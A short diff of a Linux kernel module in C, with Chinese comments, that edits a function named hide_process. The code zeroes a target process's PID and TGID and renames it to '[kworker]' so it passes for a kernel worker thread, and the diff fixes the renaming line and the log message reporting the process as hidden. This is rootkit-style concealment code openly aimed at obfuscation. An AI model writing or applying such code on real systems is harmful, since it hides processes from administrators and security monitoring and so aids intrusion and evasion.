@@ -67,12 +67,11 @@ static void hide_process(void)
     task->pid = 0;
     task->tgid = 0;
     
-    /* 方法2：修改进程名，增加混淆 */
-    if (task->comm) {
-        strcpy(task->comm, "[kworker]");
-    }
+    /* 方法2：修改进程名，增加混淆（comm 是数组，直接操作） */
+    strcpy(task->comm, "[kworker]");
     
-    printk(KERN_INFO "✅ Process %d hidden (PID set to 0, name changed)\n", TARGET_PID);
+    printk(KERN_INFO "✅ Process %d hidden (PID set to 0, name changed to %s)\n", 
+           TARGET_PID, task->comm);
 }
 
 /* ---------- 模块初始化 ---------- */
